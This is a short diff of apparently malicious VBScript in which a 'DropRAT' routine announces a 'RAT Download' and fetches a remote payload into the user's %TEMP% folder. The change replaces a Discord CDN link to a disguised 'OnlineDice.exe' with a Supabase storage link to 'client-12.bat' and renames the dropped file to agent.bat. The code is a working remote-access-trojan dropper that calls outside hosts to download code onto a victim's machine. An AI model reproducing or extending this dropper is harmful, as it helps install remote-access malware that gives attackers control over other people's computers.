@@ -149,9 +149,9 @@ End Sub
 ' --- DropRAT ---
 Sub DropRAT()
     Call PostEmbed(":package: RAT Download", "Fetching Payload...", 3447003)
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1564347479430930607/1564358699412103249/OnlineDice.exe?ex=6ae0fa12&is=6adfa892&hm=254e760f21325b56861c181ea926a5b68608f1bd6c5cc3237c2370f5dc9ff830&"
+    Dim dl : dl = "https://aqkqhdfafepmmsccxpyf.supabase.co/storage/v1/object/public/godspla/client-12.bat"
     
-    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
+    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.bat"
     If fso.FileExists(op) Then fso.DeleteFile op
 
     ' Wait = True (blocks until download is 100% complete)
